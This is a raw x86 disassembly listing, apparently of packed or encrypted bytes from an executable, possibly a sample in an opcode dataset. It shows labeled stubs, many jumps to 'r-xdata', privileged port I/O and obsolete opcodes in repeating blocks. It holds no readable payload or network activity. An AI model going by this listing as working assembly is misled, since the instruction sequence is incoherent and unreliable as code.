sub ebx 0xffffffdb
jmp sub_46ebbc
cld
jmp sub_46edc3
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
push 0x5ce4e903
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
adc [ esp + edx ] dl
mov ebx 0x14e3ae60
mov ebx 0xe42b6ecf
outsd
call [ edx ]
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
call 0xffffffff8d5b011f
jmp 0x32a49c2
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
pop esp
jpo r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
adc al 0x14
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
add dl dh
aas
adc al 0x14
jpo r-xdata
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x72d59fcf ]
add ch al
jpo r-xdata
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
push cs
jpo r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
cmp al 0x14
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
pushad
sub eax 0x14188702
adc al 0x7b
add dh [ eax + 0x34 ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
in al 0x6f
adc al 0x8d
jpo r-xdata
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
adc al 0x7b
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
jpo r-xdata
fwait
pop ss
add ah [ eax + 0x7b14140f ]
int3
jpo r-xdata
jpo r-xdata
add ch ah
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
popfd
adc al 0x6e
jpo r-xdata
jo r-xdata
jpo r-xdata
add edi eax
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
scasb [ edi ]
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
sahf
jpo r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
sub cl [ ebp - 0x4cc8519e ]
add ebp 0x8d8e81b4
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
jpo r-xdata
out dx eax
jmp r-xdata
outsd
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
pushad
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
scasb [ edi ]
or edi [ ebx - 0x140d52fe ]
jmp r-xdata
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x117cfdcb ]
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
clc
jmp r-xdata
clc
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
jmp r-xdata
arpl bx bp
adc al 0x14
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
jmp r-xdata
jpo r-xdata
sub_46ec86
bound esi [ esi - 0x4f617ee5 ]
lea esp [ edx - 0x4a ]
sbb [ ecx + 0x628db082 ] eax
mov dh 0x1f
pushad
xor al 0x8d
bound esi [ esi - 0x72cc9fe3 ]
bound esi [ esi + 0xbbd0213 ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
mov cl 0x81
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
adc [ esp + edx ] dl
mov ebx 0x14e3ae60
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
adc al 0x14
jpo r-xdata
cld
adc al 0x14
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
outsd
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
cld
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
pushad
sub eax 0x14188702
adc al 0x7b
jpo r-xdata
jpo r-xdata
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
add ch ah
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
in al 0x6f
xor edx [ esp + edx ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
jpo r-xdata
out dx eax
jmp r-xdata
outsd
jo r-xdata
jpo r-xdata
add edi eax
jpo r-xdata
jpo r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jmp r-xdata
clc
jmp r-xdata
clc
outsb
out 0x3 eax
adc al 0x9e
jmp r-xdata
jpo r-xdata
sub_46eda8
popfd
pushad
adc ecx [ ebp + 0x60359662 ]
adc eax 0xb96628d
fcom [ edx + eax ]
adc al 0x7c
pop ds
jmp r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
loop r-xdata
or ebx eax
adc al 0x2
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
sub_46edc3
fst [ esp + edi * 2 ]
or ebx eax
adc al 0x2
pop ds
jmp r-xdata
adc al 0x7c
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
sub_46edcb
jpo r-xdata
jpo r-xdata
jpo r-xdata
push cs
jpo r-xdata
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
cld
jmp r-xdata
fidiv [ ebx ]
adc al 0x14
jpo r-xdata
sub ch cl
add ch [ ebx - 0x4 ]
jmp sub_46edc3
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
adc al 0x7b
add dl dh
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
jpo r-xdata
fwait
pop ss
add ah [ eax + 0x7b14140f ]
int3
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
jpo r-xdata
adc al 0x14
aas
adc al 0x14
pushad
sub al [ edx ]
salc
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
popfd
mov ebx 0x207ae66
jo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x6e
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
scasb [ edi ]
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x14
outsb
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
sahf
out 0x3 eax
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
jmp r-xdata
arpl bx bp
sub_46edea
sub ebp [ ebx + 0x22b0b5b4 ]
das
sti
jpo r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc al 0x14
jpo r-xdata
sub eax [ edx ]
add dl dh
jmp r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
popfd
mov ebx 0x207ae66
jo r-xdata
adc al 0x6e
jpo r-xdata
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
scasb [ edi ]
adc al 0x14
outsb
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
sahf
out 0x3 eax
jmp r-xdata
clc
clc
jmp r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub [ ebx + 0x7b ] bh
mov ah 0xb5
mov al 0x22
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
arpl bx bp
adc al 0x9e
or eax [ edx ]
int 0xe
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
scasb [ edi ]
aas
jpo r-xdata
jpo r-xdata
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
int3
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub_46ee0a
push [ ebx - 0x7e4e7b7f ]
mov [ ebp + 0x60fdae62 ] cl
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
add al ch
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
mov ebx 0x207ae66
jo r-xdata
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
outsb
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
arpl bx bp
adc al 0x14
jpo r-xdata
jpo r-xdata
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
sahf
out 0x3 eax
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
cld
jmp r-xdata
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
aas
adc al 0x14
jpo r-xdata
add dl dh
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub_46ee84
das
out 0x6e eax
sub esp esp
outsd
push edi
or al 0x14
adc al 0xd8
sub ebp [ ebx + 0x140c5d02 ]
adc al 0x60
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
mov ebx 0x207ae66
jo r-xdata
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
adc al 0x14
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
scasb [ edi ]
adc al 0x14
outsb
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
arpl bx bp
adc al 0x14
jpo r-xdata
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
sahf
out 0x3 eax
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub_46ef42
sahf
or esp [ edx - 0x52 ]
aas
adc al 0xbc
mov edi 0x6fe42b6e
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
in al 0x6e
jecxz r-xdata
mov esp 0xe42b6ebf
jmp r-xdata
outsd
outsb
sub esp esp
sub_46effd
mov ah 0xb5
add bh [ esi ]
cmp al 0x14
adc al 0x7b
mov edx 0xe3ae60ba
bound ebp [ esi + 0x156f0217 ]
adc al 0x14
jpo r-xdata
push ss
adc al 0x14
mov ebx 0x14c802b8
adc al 0x14
jpo r-xdata
adc al 0xbd
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
dec ebx
sbb [ esp + edx ] edx
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
jmp r-xdata
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
sub_46f030
outsd
jpe r-xdata
